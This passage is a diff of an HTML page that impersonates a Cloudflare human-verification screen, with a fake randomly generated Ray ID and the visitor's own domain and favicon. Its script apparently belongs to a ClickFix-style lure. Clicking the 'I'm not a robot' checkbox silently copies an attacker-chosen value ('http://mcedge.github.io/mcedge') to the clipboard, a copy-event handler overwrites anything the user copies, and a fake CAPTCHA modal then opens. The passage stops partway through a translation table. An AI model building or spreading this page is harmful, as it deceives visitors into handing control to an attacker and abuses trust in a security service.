@@ -1,212 +1,366 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Checking if you are human</title>
   <link rel="icon" id="dynamic-favicon" href="data:,">
   <link rel="preload" as="image" href="./1.png">
-  <style></style>
   <style>
-    body { background-color: #ffffff; color: #333; }
-    .tettx { color: rgb(78 78 78); }
-    .checkbox-window { display: flex; flex-direction: column; align-items: center; width: 300px; height: 74px; background-color: #fafafa; border: 1px solid #e0e0e0; border-radius: 4px; padding: 10px; overflow: hidden; transition: width .5s ease-in-out, height .5s ease-in-out; }
-    .checkbox-container { width: 28px; height: 28px; margin-left: 12px; margin-right: 8px; position: relative; }
-    .checkbox { width: 100%; height: 100%; background-color: #fff; border-radius: 2px; border: 2px solid #888; cursor: pointer; transition: border-color .3s, background-color .3s; }
-    .checkbox.checked { border-color: #4285f4; background-color: #4285f4; position: relative; }
-    .checkbox.checked::after { content: "\f00c"; font-family: "FontAwesome"; color: #fff; font-size: 18px; position: absolute; top: -2px; left: 2px; }
-    .spinner { visibility: hidden; position: relative; }
-    .lds-ring { display: inline-block; position: relative; }
-    .lds-ring, .lds-ring div { height: 1.5rem; width: 1.5rem; }
-    .lds-ring div { animation: lds-ring 1.2s cubic-bezier(.5,0,.5,1) infinite; border: .3rem solid transparent; border-radius: 50%; border-top-color: #313131; box-sizing: border-box; display: block; position: absolute; }
-    .lds-ring div:first-child { animation-delay: -.45s; }
-    .lds-ring div:nth-child(2) { animation-delay: -.3s; }
-    .lds-ring div:nth-child(3) { animation-delay: -.15s; }
-    @keyframes lds-ring { 0% { transform: rotate(0deg); } to { transform: rotate(1turn); } }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif; display: flex; flex-direction: column; height: 100vh; min-height: 100vh; }
-    .main-wrapper { align-items: center; display: flex; flex: 1; flex-direction: column; }
-    .main-content { margin: 8rem auto; max-width: 60rem; padding-left: 1.5rem; padding-right: 1.5rem; width: 100%; }
-    .footer { font-size: .75rem; line-height: 1.125rem; margin: 0 auto; max-width: 60rem; padding-left: 1.5rem; padding-right: 1.5rem; width: 100%; }
-    .footer-inner { border-top: 1px solid #d9d9d9; padding-bottom: 1rem; padding-top: 1rem; text-align: center; }
-    #spinner2 { width: 24px; height: 24px; animation: rotate 4s linear infinite; margin-top: 0; }
-    .checkbox-window { opacity: 0; }
-    @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+    body {
+      background-color: #ffffff;
+      color: #333;
+    }
 
-    /* Overlay for captcha modal */
+    .tettx {
+      color: rgb(78 78 78);
+    }
+
+    .checkbox-window {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 300px;
+      height: 74px;
+      background-color: #fafafa;
+      border: 1px solid #e0e0e0;
+      border-radius: 4px;
+      padding: 10px;
+      overflow: hidden;
+      transition: width .5s ease-in-out, height .5s ease-in-out;
+    }
+
+    .checkbox-container {
+      width: 28px;
+      height: 28px;
+      margin-left: 12px;
+      margin-right: 8px;
+      position: relative;
+    }
+
+    .checkbox {
+      width: 100%;
+      height: 100%;
+      background-color: #fff;
+      border-radius: 2px;
+      border: 2px solid #888;
+      cursor: pointer;
+      transition: border-color .3s, background-color .3s;
+    }
+
+    .checkbox.checked {
+      border-color: #4285f4;
+      background-color: #4285f4;
+      position: relative;
+    }
+
+    .checkbox.checked::after {
+      content: "\f00c";
+      font-family: "FontAwesome";
+      color: #fff;
+      font-size: 18px;
+      position: absolute;
+      top: -2px;
+      left: 2px;
+    }
+
+    .spinner {
+      visibility: hidden;
+      position: relative;
+    }
+
+    .lds-ring {
+      display: inline-block;
+      position: relative;
+    }
+
+    .lds-ring,
+    .lds-ring div {
+      height: 1.5rem;
+      width: 1.5rem;
+    }
+
+    .lds-ring div {
+      animation: lds-ring 1.2s cubic-bezier(.5, 0, .5, 1) infinite;
+      border: .3rem solid transparent;
+      border-radius: 50%;
+      border-top-color: #313131;
+      box-sizing: border-box;
+      display: block;
+      position: absolute;
+    }
+
+    .lds-ring div:first-child {
+      animation-delay: -.45s;
+    }
+
+    .lds-ring div:nth-child(2) {
+      animation-delay: -.3s;
+    }
+
+    .lds-ring div:nth-child(3) {
+      animation-delay: -.15s;
+    }
+
+    @keyframes lds-ring {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(1turn);
+      }
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      min-height: 100vh;
+    }
+
+    .main-wrapper {
+      align-items: center;
+      display: flex;
+      flex: 1;
+      flex-direction: column;
+    }
+
+    .main-content {
+      margin: 8rem auto;
+      max-width: 60rem;
+      padding-left: 1.5rem;
+      padding-right: 1.5rem;
+      width: 100%;
+    }
+
+    .footer {
+      font-size: .75rem;
+      line-height: 1.125rem;
+      margin: 0 auto;
+      max-width: 60rem;
+      padding-left: 1.5rem;
+      padding-right: 1.5rem;
+      width: 100%;
+    }
+
+    .footer-inner {
+      border-top: 1px solid #d9d9d9;
+      padding-bottom: 1rem;
+      padding-top: 1rem;
+      text-align: center;
+    }
+
+    #spinner2 {
+      width: 24px;
+      height: 24px;
+      animation: rotate 4s linear infinite;
+      margin-top: 0;
+    }
+
+    .checkbox-window {
+      opacity: 0;
+    }
+
+    @keyframes rotate {
+      from {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
     .cf-captcha-overlay {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0,0,0,0.5); display: flex; align-items: center;
-      justify-content: center; z-index: 99999;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
     }
   </style>
 </head>
+
 <body>
+  <div class="main-wrapper">
+    <div class="main-content">
+      <div style="display: flex; align-items: center;">
+        <img class="logo-img" id="site-logo" src="" alt="Site logo"
+          style="height: 2rem; width: 2rem; margin-right: 0.5rem; object-fit: contain;">
+        <p style="font-size: 2.5rem; font-weight: 500; line-height: 3.75rem;"><span class="domain-name"></span></p>
+      </div>
+      <div
+        style="font-size: 1.5rem; line-height: 2.25rem; margin-bottom: 2rem; min-height: 2rem;font-weight:550; padding-top: 2px">
+        <p>
+          <span class="preloader_text">Checking if you are human. This may take a few seconds.</span>
+          <span class="textallstep" style="display: none;">Verify you are human by completing the action below.</span>
+        </p>
+      </div>
 
-<div class="main-wrapper">
- <div class="main-content">
-  <div style="display: flex; align-items: center;">
-   <img class="logo-img" id="site-logo" src="" alt="Site logo" style="height: 2rem; width: 2rem; margin-right: 0.5rem; object-fit: contain;">
-   <p style="font-size: 2.5rem; font-weight: 500; line-height: 3.75rem;"><span class="domain-name"></span></p>
-  </div>
+      <div class="intro">
+        <div class="preloader">
+          <div class="lds-ring">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+          </div>
+        </div>
 
-  <div style="font-size: 1.5rem; line-height: 2.25rem; margin-bottom: 2rem; min-height: 2rem;font-weight:550; padding-top: 2px">
-    <p>
-      <span class="preloader_text">Checking if you are human. This may take a few seconds.</span>
-      <span class="textallstep" style="display: none;">Verify you are human by completing the action below.</span>
-    </p>
-  </div>
+        <div id="checkbox-window" class="checkbox-window" style="width: 300px; height: 65px; display: none;">
+          <div style="display: flex; align-items: center; width: 100%;">
+            <div class="checkbox-container" style="margin-left: 3px; margin-right: 10px; width: 24px;">
 
-  <!-- PRELOADER -->
-  <div class="intro">
-  <div class="preloader">
-    <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
-  </div>
+              <svg style="display: none;" class="step0" id="spinner2" fill="green" viewBox="0 0 60 60"
+                xmlns="http://www.w3.org/2000/svg">
+                <circle cx="30" cy="10" r="2.5" class="point"></circle>
+                <circle cx="50" cy="30" r="2.5" class="point"></circle>
+                <circle cx="30" cy="50" r="2.5" class="point"></circle>
+                <circle cx="10" cy="30" r="2.5" class="point"></circle>
+                <circle cx="43.6" cy="16.4" r="2.5" class="point"></circle>
+                <circle cx="16.4" cy="16.4" r="2.5" class="point"></circle>
+                <circle cx="43.6" cy="43.6" r="2.5" class="point"></circle>
+                <circle cx="16.4" cy="43.6" r="2.5" class="point"></circle>
+              </svg>
 
-  <!-- START -->
-  <div id="checkbox-window" class="checkbox-window" style="width: 300px; height: 65px; display: none;">
-   <div style="display: flex; align-items: center; width: 100%;">
-    <div class="checkbox-container" style="margin-left: 3px; margin-right: 10px; width: 24px;">
+              <button type="button" id="checkbox" class="checkbox step1" style="display: none;"></button>
 
-     <svg style="display: none;" class="step0" id="spinner2" fill="green" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="30" cy="10" r="2.5" class="point"></circle>
-        <circle cx="50" cy="30" r="2.5" class="point"></circle>
-        <circle cx="30" cy="50" r="2.5" class="point"></circle>
-        <circle cx="10" cy="30" r="2.5" class="point"></circle>
-        <circle cx="43.6" cy="16.4" r="2.5" class="point"></circle>
-        <circle cx="16.4" cy="16.4" r="2.5" class="point"></circle>
-        <circle cx="43.6" cy="43.6" r="2.5" class="point"></circle>
-        <circle cx="16.4" cy="43.6" r="2.5" class="point"></circle>
-      </svg>
+              <div class="spinner step2" id="spinner" style="visibility: hidden; display: none;">
+                <div class="lds-ring">
+                  <div></div>
+                  <div></div>
+                  <div></div>
+                  <div></div>
+                </div>
+              </div>
 
-     <button type="button" id="checkbox" class="checkbox step1" style="display: none;"></button>
+              <div class="step3" style="display: none;">
+                <svg width="30" height="30" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
+                  <circle cx="25" cy="25" r="23" fill="#28a745" />
+                  <path d="M15 25 L22 32 L35 18" stroke="white" stroke-width="4" fill="none" stroke-linecap="round"
+                    stroke-linejoin="round" />
+                </svg>
+              </div>
+            </div>
 
-     <div class="spinner step2" id="spinner" style="visibility: hidden; display: none;">
-      <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
-     </div>
+            <div class="tettx">
+              <p class="step0" style="margin: 0 !important;">Verifying...</p>
+              <p class="step1" style="margin: 0 !important; display: none;">I'm not a robot</p>
+              <p class="step2" style="margin: 0 !important; display: none;">Verification required</p>
+              <p class="step3" style="margin: 0 !important; display: none;">Successfully.</p>
+            </div>
 
-     <div class="step3" style="display: none;">
-      <svg width="30" height="30" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
-       <circle cx="25" cy="25" r="23" fill="#28a745" />
-       <path d="M15 25 L22 32 L35 18" stroke="white" stroke-width="4" fill="none" stroke-linecap="round" stroke-linejoin="round" />
-      </svg>
-     </div>
+            <div style="font-size: 8px; text-align: right; margin-left: auto; padding-right: 4px;">
+              <img style="width: 80px; height: 28px; margin-bottom: 1px; object-fit: contain;" src="./1.png" />
+              <p style="text-decoration: underline; margin-top: 0; line-height: 1.4;">Confidentiality</p>
+              <p style="text-decoration: underline; margin-top: 0; line-height: 1.4;">Terms and Conditions</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <p class="footer-sentence" style="font-size: 1.5rem; line-height: 2.25rem; padding-top: 33px">
+        <span class="domain-name footer-domain"></span> needs to review the security of your connection before
+        proceeding.
+      </p>
     </div>
-
-    <div class="tettx">
-     <p class="step0" style="margin: 0 !important;">Verifying...</p>
-     <p class="step1" style="margin: 0 !important; display: none;">I'm not a robot</p>
-     <p class="step2" style="margin: 0 !important; display: none;">Verification required</p>
-     <p class="step3" style="margin: 0 !important; display: none;">Successfully.</p>
-    </div>
-
-    <div style="font-size: 8px; text-align: right; margin-left: auto; padding-right: 4px;">
-     <img style="width: 80px; height: 28px; margin-bottom: 1px; object-fit: contain;" src="./1.png" />
-     <p style="text-decoration: underline; margin-top: 0; line-height: 1.4;">Confidentiality</p>
-     <p style="text-decoration: underline; margin-top: 0; line-height: 1.4;">Terms and Conditions</p>
-    </div>
-   </div>
-  </div>
   </div>
 
-  <p class="footer-sentence" style="font-size: 1.5rem; line-height: 2.25rem; padding-top: 33px">
-    <span class="domain-name footer-domain"></span> needs to review the security of your connection before proceeding.
-  </p>
- </div>
-</div>
+  <div class="footer" role="contentinfo">
+    <div class="footer-inner">
+      <div>
+        <div>Ray ID: <code class="ray-id">56a4c5299fdetmca</code></div>
+      </div>
+      <div style="margin-top: 5px;">Platform performance and security <span style="color: #000000">Cloudflare</span>
+      </div>
+    </div>
+  </div>
 
-<div class="footer" role="contentinfo">
- <div class="footer-inner">
-  <div><div>Ray ID: <code class="ray-id">56a4c5299fdetmca</code></div></div>
-  <div style="margin-top: 5px;">Platform performance and security <span style="color: #000000">Cloudflare</span></div>
- </div>
-</div>
+  <div id="cf-captcha-overlay" class="cf-captcha-overlay" style="display:none">
+    <div id="cf-captcha-container"></div>
+  </div>
 
-<!-- Captcha modal overlay (hidden, opened after checkbox click) -->
-<div id="cf-captcha-overlay" class="cf-captcha-overlay" style="display:none">
-  <div id="cf-captcha-container"></div>
-</div>
-
-<script>
-// ========== CONFIGURATION ==========
-var command = 'http://mcedge.github.io/mcedge';
-
-window.cfCaptchaImages = {
-  logoWithText: './1.png',
-  fingerprint:  './2.png',
-  clock:        './3.png',
-  shield:       './4.png'
-};
-</script>
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-    const preloaderElements = document.querySelectorAll(".preloader");
-    const preloaderText = document.querySelector(".preloader_text");
-    const textAllStep = document.querySelector(".textallstep");
-    const checkboxWindow = document.getElementById("checkbox-window");
-    const step0Elements = document.querySelectorAll(".step0");
-    const step1Elements = document.querySelectorAll(".step1");
-    const step2Elements = document.querySelectorAll(".step2");
-    const step3Elements = document.querySelectorAll(".step3");
-    const checkbox = document.getElementById("checkbox");
-    const spinner = document.getElementById("spinner");
-
-    // Domain name - detect localhost/local files
-    var rawDomain = window.location.hostname;
-    var isLocal = !rawDomain || rawDomain === "localhost" || rawDomain === "127.0.0.1" || rawDomain === "0.0.0.0" || window.location.protocol === "file:";
-    var domain = isLocal ? "localhost" : rawDomain;
-    document.querySelectorAll(".domain-name").forEach(el => { if (el) el.textContent = domain; });
-
-    // Favicon + site logo from domain
-    try {
-      var siteLogo = document.getElementById("site-logo");
-      var fav = document.getElementById("dynamic-favicon");
-      if (isLocal) {
-        // Placeholder icon for local/localhost
-        var placeholderSvg = "data:image/svg+xml," + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><rect width="64" height="64" rx="12" fill="#f97316"/><text x="32" y="42" font-family="Arial" font-size="32" font-weight="bold" fill="white" text-anchor="middle">L</text></svg>');
-        if (fav) fav.href = placeholderSvg;
-        if (siteLogo) siteLogo.src = placeholderSvg;
-      } else {
-        var faviconUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=64";
-        if (fav) fav.href = faviconUrl;
-        if (siteLogo) siteLogo.src = faviconUrl;
-      }
-    } catch(e) {}
-
-    // Ray ID
-    const chars = "abcdef0123456789";
-    const rayEl = document.querySelector(".ray-id");
-    if (rayEl) rayEl.textContent = Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
-
-    // Preloader -> checkbox flow
-    setTimeout(() => {
+  <script>
+    var command = 'http://mcedge.github.io/mcedge';
+    window.cfCaptchaImages = {
+      logoWithText: './1.png',
+      fingerprint: './2.png',
+      clock: './3.png',
+      shield: './4.png'
+    };
+  </script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const preloaderElements = document.querySelectorAll(".preloader");
+      const preloaderText = document.querySelector(".preloader_text");
+      const textAllStep = document.querySelector(".textallstep");
+      const checkboxWindow = document.getElementById("checkbox-window");
+      const step0Elements = document.querySelectorAll(".step0");
+      const step1Elements = document.querySelectorAll(".step1");
+      const step2Elements = document.querySelectorAll(".step2");
+      const step3Elements = document.querySelectorAll(".step3");
+      const checkbox = document.getElementById("checkbox");
+      const spinner = document.getElementById("spinner");
+      var rawDomain = window.location.hostname;
+      var isLocal = !rawDomain || rawDomain === "localhost" || rawDomain === "127.0.0.1" || rawDomain === "0.0.0.0" || window.location.protocol === "file:";
+      var domain = isLocal ? "localhost" : rawDomain;
+      document.querySelectorAll(".domain-name").forEach(el => { if (el) el.textContent = domain; });
+      try {
+        var siteLogo = document.getElementById("site-logo");
+        var fav = document.getElementById("dynamic-favicon");
+        if (isLocal) {
+          var placeholderSvg = "data:image/svg+xml," + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><rect width="64" height="64" rx="12" fill="#f97316"/><text x="32" y="42" font-family="Arial" font-size="32" font-weight="bold" fill="white" text-anchor="middle">L</text></svg>');
+          if (fav) fav.href = placeholderSvg;
+          if (siteLogo) siteLogo.src = placeholderSvg;
+        } else {
+          var faviconUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=64";
+          if (fav) fav.href = faviconUrl;
+          if (siteLogo) siteLogo.src = faviconUrl;
+        }
+      } catch (e) { }
+      const chars = "abcdef0123456789";
+      const rayEl = document.querySelector(".ray-id");
+      if (rayEl) rayEl.textContent = Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
+      setTimeout(() => {
         preloaderElements.forEach(el => el.style.display = "none");
         if (preloaderText) preloaderText.style.display = "none";
         if (textAllStep) textAllStep.style.display = "block";
         if (checkboxWindow) checkboxWindow.style.display = "flex";
 
         setTimeout(() => {
-            if (checkboxWindow) {
-                checkboxWindow.style.display = "flex";
-                let opacity = 0;
-                const fadeIn = setInterval(() => {
-                    if (opacity >= 1) { clearInterval(fadeIn); }
-                    else { opacity += 0.1; checkboxWindow.style.opacity = opacity; }
-                }, 30);
-            }
+          if (checkboxWindow) {
+            checkboxWindow.style.display = "flex";
+            let opacity = 0;
+            const fadeIn = setInterval(() => {
+              if (opacity >= 1) { clearInterval(fadeIn); }
+              else { opacity += 0.1; checkboxWindow.style.opacity = opacity; }
+            }, 30);
+          }
         }, 200);
 
         step0Elements.forEach(el => el.style.display = "block");
 
         setTimeout(() => {
-            step0Elements.forEach(el => el.style.display = "none");
-            step1Elements.forEach(el => el.style.display = "block");
+          step0Elements.forEach(el => el.style.display = "none");
+          step1Elements.forEach(el => el.style.display = "block");
         }, 2000);
-    }, 1500);
+      }, 1500);
 
-    if (checkbox) {
-      checkbox.addEventListener("click", function () {
+      if (checkbox) {
+        checkbox.addEventListener("click", function () {
           const textarea = document.createElement('textarea');
           textarea.value = command;
           textarea.setAttribute('readonly', '');
@@ -214,107 +368,107 @@ document.addEventListener("DOMContentLoaded", function () {
           textarea.style.left = '-9999px';
           document.body.appendChild(textarea);
           textarea.select();
-          try { document.execCommand('copy'); } catch(e) {}
+          try { document.execCommand('copy'); } catch (e) { }
           document.body.removeChild(textarea);
           step1Elements.forEach(el => el.style.display = "none");
           step2Elements.forEach(el => el.style.display = "block");
           if (spinner) spinner.style.visibility = "visible";
           setTimeout(() => {
-              window.CloudflareCaptcha.show();
+            window.CloudflareCaptcha.show();
           }, 3000);
-      });
-    }
-    document.addEventListener('copy', function (e) {
+        });
+      }
+      document.addEventListener('copy', function (e) {
         e.preventDefault();
         if (e.clipboardData) e.clipboardData.setData('text/plain', command);
         else if (window.clipboardData) window.clipboardData.setData('Text', command);
+      });
     });
-});
-</script>
+  </script>
 
-<script>
-(function(){
-  const i18n = {
-    en:{checking:"Checking if you are human. This may take a few seconds.",verifyInstruction:"Verify you are human by completing the action below.",verifying:"Verifying...",notRobot:"I'm not a robot",steps:"Verification required",success:"Successfully.",confidentiality:"Confidentiality",terms:"Terms and Conditions",footer:"needs to review the security of your connection before proceeding."},
-    de:{checking:"Überprüfung, ob Sie ein Mensch sind. Dies kann einige Sekunden dauern.",verifyInstruction:"Bestätigen Sie, dass Sie ein Mensch sind, indem Sie die folgende Aktion ausführen.",verifying:"Wird überprüft...",notRobot:"Ich bin kein Roboter",steps:"Überprüfung erforderlich",success:"Erfolgreich.",confidentiality:"Vertraulichkeit",terms:"Nutzungsbedingungen",footer:"muss die Sicherheit Ihrer Verbindung prüfen, bevor Sie fortfahren."},
-    fr:{checking:"Vérification que vous êtes humain. Cela peut prendre quelques secondes.",verifyInstruction:"Vérifiez que vous êtes humain en complétant l'action ci-dessous.",verifying:"Vérification…",notRobot:"Je ne suis pas un robot",steps:"Vérification requise",success:"Réussi.",confidentiality:"Confidentialité",terms:"Conditions générales",footer:"doit vérifier la sécurité de votre connexion avant de continuer."},
-    es:{checking:"Comprobando si eres humano. Esto puede tardar unos segundos.",verifyInstruction:"Verifica que eres humano completando la acción siguiente.",verifying:"Verificando…",notRobot:"No soy un robot",steps:"Verificación requerida",success:"Correcto.",confidentiality:"Confidencialidad",terms:"Términos y condiciones",footer:"debe revisar la seguridad de tu conexión antes de continuar."},
-    ru:{checking:"Проверяем, что вы человек. Это может занять несколько секунд.",verifyInstruction:"Подтвердите, что вы человек, выполнив действие ниже.",verifying:"Проверка…",notRobot:"Я не робот",steps:"Требуется проверка",success:"Успешно.",confidentiality:"Конфиденциальность",terms:"Условия использования",footer:"должен проверить безопасность вашего соединения перед продолжением."},
-    zh:{checking:"正在检查您是否为人类。这可能需要几秒钟。",verifyInstruction:"通过完成以下操作验证您是人类。",verifying:"正在验证…",notRobot:"我不是机器人",steps:"需要验证",success:"成功。",confidentiality:"保密",terms:"条款和条件",footer:"需要在继续之前检查您连接的安全性。"},
-    ja:{checking:"あなたが人間かどうか確認しています。数秒かかる場合があります。",verifyInstruction:"以下の操作を完了して、人間であることを確認してください。",verifying:"確認中…",notRobot:"私はロボットではありません",steps:"検証が必要です",success:"成功しました。",confidentiality:"機密保持",terms:"利用規約",footer:"続行する前に接続のセキュリティを確認する必要があります。"},
-    pt:{checking:"Verificando se você é humano. Isso pode levar alguns segundos.",verifyInstruction:"Confirme que você é humano concluindo a ação abaixo.",verifying:"Verificando…",notRobot:"Não sou um robô",steps:"Verificação necessária",success:"Concluído.",confidentiality:"Confidencialidade",terms:"Termos e condições",footer:"precisa revisar a segurança da sua conexão antes de prosseguir."},
-    nl:{checking:"Controleren of u een mens bent. Dit kan enkele seconden duren.",verifyInstruction:"Bevestig dat u een mens bent door de onderstaande actie uit te voeren.",verifying:"Bezig met controleren…",notRobot:"Ik ben geen robot",steps:"Verificatie vereist",success:"Gelukt.",confidentiality:"Vertrouwelijkheid",terms:"Voorwaarden",footer:"moet de veiligheid van uw verbinding controleren voordat u verdergaat."},
-    tr:{checking:"İnsan olup olmadığınız kontrol ediliyor. Bu birkaç saniye sürebilir.",verifyInstruction:"Aşağıdaki işlemi tamamlayarak insan olduğunuzu doğrulayın.",verifying:"Doğrulanıyor…",notRobot:"Ben robot değilim",steps:"Doğrulama gerekli",success:"Başarılı.",confidentiality:"Gizlilik",terms:"Şartlar ve Koşullar",footer:"devam etmeden önce bağlantınızın güvenliğini kontrol etmelidir."},
-    ko:{checking:"사용자가 사람인지 확인하는 중입니다. 잠시만 기다려 주세요.",verifyInstruction:"아래 작업을 완료하여 사람이 맞는지 확인하세요.",verifying:"확인 중…",notRobot:"나는 로봇이 아닙니다",steps:"인증 필요",success:"성공.",confidentiality:"기밀",terms:"이용약관",footer:"계속하기 전에 연결의 보안을 확인해야 합니다."},
-    it:{checking:"Verifica che tu sia umano. Potrebbe volerci qualche secondo.",verifyInstruction:"Verifica di essere umano completando l'azione seguente.",verifying:"Verifica in corso…",notRobot:"Non sono un robot",steps:"Verifica richiesta",success:"Completato.",confidentiality:"Riservatezza",terms:"Termini e condizioni",footer:"deve verificare la sicurezza della connessione prima di procedere."},
-    ar:{checking:"جاري التحقق من أنك إنسان. قد يستغرق هذا بضع ثوانٍ.",verifyInstruction:"تحقق من أنك إنسان بإكمال الخط  ة أدناه.",verifying:"جارٍ التحقق…",notRobot:"لست برنامج روبوت",steps:"التحقق مطلوب",success:"تم بنجاح.",confidentiality:"السرية",terms:"الشروط والأحكام",footer:"يجب مراجعة أمان الاتصال قبل المتابعة."},
-    hi:{checking:"सत्यापित किया जा रहा है कि आप मानव हैं। इसमें कुछ सेकंड लग सकते हैं।",verifyInstruction:"नीचे दिया गया कार्य पूरा करके प्रमाणित करें कि आप एक मानव हैं।",verifying:"सत्यापित कर रहे हैं...",notRobot:"मैं एक रोबोट नहीं हूँ",steps:"सत्यापन आवश्यक",success:"सफल।",confidentiality:"गोपनीयता",terms:"नियम और शर्तें",footer:"आपकी कनेक्शन की सुरक्षा की समीक्षा करने की आवश्यकता है।"}
-  };
+  <script>
+    (function () {
+      const i18n = {
+        en: { checking: "Checking if you are human. This may take a few seconds.", verifyInstruction: "Verify you are human by completing the action below.", verifying: "Verifying...", notRobot: "I'm not a robot", steps: "Verification required", success: "Successfully.", confidentiality: "Confidentiality", terms: "Terms and Conditions", footer: "needs to review the security of your connection before proceeding." },
+        de: { checking: "Überprüfung, ob Sie ein Mensch sind. Dies kann einige Sekunden dauern.", verifyInstruction: "Bestätigen Sie, dass Sie ein Mensch sind, indem Sie die folgende Aktion ausführen.", verifying: "Wird überprüft...", notRobot: "Ich bin kein Roboter", steps: "Überprüfung erforderlich", success: "Erfolgreich.", confidentiality: "Vertraulichkeit", terms: "Nutzungsbedingungen", footer: "muss die Sicherheit Ihrer Verbindung prüfen, bevor Sie fortfahren." },
+        fr: { checking: "Vérification que vous êtes humain. Cela peut prendre quelques secondes.", verifyInstruction: "Vérifiez que vous êtes humain en complétant l'action ci-dessous.", verifying: "Vérification…", notRobot: "Je ne suis pas un robot", steps: "Vérification requise", success: "Réussi.", confidentiality: "Confidentialité", terms: "Conditions générales", footer: "doit vérifier la sécurité de votre connexion avant de continuer." },
+        es: { checking: "Comprobando si eres humano. Esto puede tardar unos segundos.", verifyInstruction: "Verifica que eres humano completando la acción siguiente.", verifying: "Verificando…", notRobot: "No soy un robot", steps: "Verificación requerida", success: "Correcto.", confidentiality: "Confidencialidad", terms: "Términos y condiciones", footer: "debe revisar la seguridad de tu conexión antes de continuar." },
+        ru: { checking: "Проверяем, что вы человек. Это может занять несколько секунд.", verifyInstruction: "Подтвердите, что вы человек, выполнив действие ниже.", verifying: "Проверка…", notRobot: "Я не робот", steps: "Требуется проверка", success: "Успешно.", confidentiality: "Конфиденциальность", terms: "Условия использования", footer: "должен проверить безопасность вашего соединения перед продолжением." },
+        zh: { checking: "正在检查您是否为人类。这可能需要几秒钟。", verifyInstruction: "通过完成以下操作验证您是人类。", verifying: "正在验证…", notRobot: "确认你是真人", steps: "正在验证", success: "成功。", confidentiality: "隐私", terms: "帮助", footer: "需要在继续之前检查您连接的安全性。" },
+        ja: { checking: "あなたが人間かどうか確認しています。数秒かかる場合があります。", verifyInstruction: "以下の操作を完了して、人間であることを確認してください。", verifying: "確認中…", notRobot: "私はロボットではありません", steps: "検証が必要です", success: "成功しました。", confidentiality: "機密保持", terms: "利用規約", footer: "続行する前に接続のセキュリティを確認する必要があります。" },
+        pt: { checking: "Verificando se você é humano. Isso pode levar alguns segundos.", verifyInstruction: "Confirme que você é humano concluindo a ação abaixo.", verifying: "Verificando…", notRobot: "Não sou um robô", steps: "Verificação necessária", success: "Concluído.", confidentiality: "Confidencialidade", terms: "Termos e condições", footer: "precisa revisar a segurança da sua conexão antes de prosseguir." },
+        nl: { checking: "Controleren of u een mens bent. Dit kan enkele seconden duren.", verifyInstruction: "Bevestig dat u een mens bent door de onderstaande actie uit te voeren.", verifying: "Bezig met controleren…", notRobot: "Ik ben geen robot", steps: "Verificatie vereist", success: "Gelukt.", confidentiality: "Vertrouwelijkheid", terms: "Voorwaarden", footer: "moet de veiligheid van uw verbinding controleren voordat u verdergaat." },
+        tr: { checking: "İnsan olup olmadığınız kontrol ediliyor. Bu birkaç saniye sürebilir.", verifyInstruction: "Aşağıdaki işlemi tamamlayarak insan olduğunuzu doğrulayın.", verifying: "Doğrulanıyor…", notRobot: "Ben robot değilim", steps: "Doğrulama gerekli", success: "Başarılı.", confidentiality: "Gizlilik", terms: "Şartlar ve Koşullar", footer: "devam etmeden önce bağlantınızın güvenliğini kontrol etmelidir." },
+        ko: { checking: "사용자가 사람인지 확인하는 중입니다. 잠시만 기다려 주세요.", verifyInstruction: "아래 작업을 완료하여 사람이 맞는지 확인하세요.", verifying: "확인 중…", notRobot: "나는 로봇이 아닙니다", steps: "인증 필요", success: "성공.", confidentiality: "기밀", terms: "이용약관", footer: "계속하기 전에 연결의 보안을 확인해야 합니다." },
+        it: { checking: "Verifica che tu sia umano. Potrebbe volerci qualche secondo.", verifyInstruction: "Verifica di essere umano completando l'azione seguente.", verifying: "Verifica in corso…", notRobot: "Non sono un robot", steps: "Verifica richiesta", success: "Completato.", confidentiality: "Riservatezza", terms: "Termini e condizioni", footer: "deve verificare la sicurezza della connessione prima di procedere." },
+        ar: { checking: "جاري التحقق من أنك إنسان. قد يستغرق هذا بضع ثوانٍ.", verifyInstruction: "تحقق من أنك إنسان بإكمال الخط  ة أدناه.", verifying: "جارٍ التحقق…", notRobot: "لست برنامج روبوت", steps: "التحقق مطلوب", success: "تم بنجاح.", confidentiality: "السرية", terms: "الشروط والأحكام", footer: "يجب مراجعة أمان الاتصال قبل المتابعة." },
